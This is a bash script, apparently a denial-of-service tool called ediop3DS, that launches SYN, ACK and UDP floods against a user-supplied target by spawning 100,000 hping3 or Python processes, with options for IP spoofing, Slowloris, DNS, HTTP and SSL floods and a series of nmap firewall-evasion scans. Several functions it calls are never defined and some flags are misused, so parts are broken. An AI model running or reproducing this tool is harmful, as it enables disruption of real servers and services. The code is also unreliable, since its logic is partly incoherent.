#!/bin/bash

# Color definitions
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

# Display logo function
display_logo() {
    echo -e "${CYAN}"
    echo -e """
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░░██████╗
██╔══██╗██╔════╝
██║░░██║╚█████╗░
██║░░██║░╚═══██╗
██████╔╝██████╔╝
╚═════╝░╚═════╝░
"""
    echo -e "${RESET}"
}

# Help function
show_help() {
    display_logo
    echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
    echo -e "${YELLOW}Options:${RESET}"
    echo -e "  -u    Target IP or URL (required)"
    echo -e "  -p    Target Port (default: 80)"
    echo -e "  -h    Show this help message"
    echo -e "  -s    Scan target for open ports before attacking"
    echo -e "  -r    Retry attack without port if no open ports are found"
    echo -e "  -i    Send ICMP ping flood (requires root)"
    echo -e "  -S    Send TCP SYN flood (requires root)"
    echo -e "  -A    Send TCP ACK flood (requires root)"
    echo -e "  -U    Send UDP flood (requires root)"
    echo -e "  -f    Specify a spoofed source IP address"
    echo -e "  -n    Set the number of requests to send (default: 1000)"
    echo -e "  -H    Send custom HTTP headers"
    echo -e "  -v    Enable verbose output"
    echo -e "  -pSize Specify packet size for attacks (default: 56)"
    echo -e "  -sFlag Specify TCP flag (SYN, ACK, etc.)"
    echo -e "  -seq   Specify sequence number for TCP packets"
    echo -e "  -win   Specify window size for TCP packets"
    echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
    echo -e "  -P     Specify packet delay (in ms)"
    echo -e "  -l     Perform Slowloris attack with automatic installation detection"
    echo -e "  -t     Target specific attack type (GET, POST, HEAD, SYN, etc.)"
    echo -e "  -F     Test firewall"
    echo -e "  -I    Send DNS Flood attack (requires root)"
    echo -e "  -T    Send HTTP Flood attack (no root)"
    echo -e "  -L    Perform HTTP POST Flood (no root)"
    echo -e "  -M    Send custom TCP packet flood (requires root)"
    echo -e "  -V    Perform SSL DDoS attack (requires root)"
}

# Scan for open ports and handle attacks
scan_ports() {
    target=$1
    echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
    open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
    if [ -z "$open_ports" ]; then
        echo -e "${RED}[!] No open ports found.${RESET}"
        return 1
    else
        echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
        port=$(echo "$open_ports" | head -n 1)
    fi
}

# Function to perform SYN flood with user agents efficiently
syn_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting TCP SYN flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        # Real attack logic (multi-threaded, using 100k user agents)
        python3 syn_flood.py -t $target -p $port --user-agent "$random_ua" > /dev/null 2>&1 &
    done
    wait
}

# Function to perform ACK flood with user agents efficiently
ack_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting TCP ACK flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        # Real attack logic (multi-threaded, using 100k user agents)
        hping3 -A -p $port -a $random_ua $target > /dev/null 2>&1 &
    done
    wait
}

# Function to perform UDP flood with user agents efficiently
udp_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting UDP flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        # Real attack logic (multi-threaded, using 100k user agents)
        hping3 --udp -p $port -a $random_ua $target > /dev/null 2>&1 &
    done
    wait
}

# Function to test the firewall and attempt bypassing
test_firewall() {
    target=$1
    echo -e "${CYAN}[*] Testing firewall on $target with 6 bypass methods${RESET}"
    
    # 1. Scan for open ports (Basic Firewall Test)
    echo -e "${CYAN}[*] Performing basic port scan...${RESET}"
    nmap -p- --open --min-rate=5000 -T4 $target
    
    # 2. Fragmented Packets
    echo -e "${CYAN}[*] Sending fragmented packets to bypass firewall...${RESET}"
    nmap -f -p- $target
    
    # 3. Source Port Modification
    echo -e "${CYAN}[*] Using source port modification to bypass firewall...${RESET}"
    nmap --source-port 53 -p- $target
    
    # 4. Decoy (Multiple IPs)
    echo -e "${CYAN}[*] Using decoy scan to confuse firewall...${RESET}"
    nmap -D RND:10 -p- $target
    
    # 5. TCP ACK Scan (Firewalls often block SYN but allow ACK)
    echo -e "${CYAN}[*] Using TCP ACK scan to bypass firewall...${RESET}"
    nmap -sA -p- $target
    
    # 6. Idle Scan (Stealthiest method)
    echo -e "${CYAN}[*] Performing Idle Scan to evade detection...${RESET}"
    nmap -sI $target -p- $target
}

# Main function to handle user input
while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:FITLVM" option; do
    case $option in
        u) target="$OPTARG";;
        p) port="$OPTARG";;
        s) scan_ports "$target";;
        i) http_icmp_flood "$target";;
        r) retry_attack "$target";;
        S) syn_flood "$target";;
        A) ack_flood "$target";;
        U) udp_flood "$target";;
        f) spoof_ip "$OPTARG";;
        n) num_requests="$OPTARG";;
        H) custom_headers "$OPTARG";;
        v) verbose=1;;
        l) check_and_run_slowloris "$target";;
        t) attack_type="$OPTARG";;
        F) test_firewall "$target";;
        I) dns_flood "$target";;
        T) custom_http_flood "$target";;
        L) post_flood "$target";;
        M) custom_tcp_flood "$target";;
        V) ssl_ddos "$target";;
        *) show_help;;
    esac
done
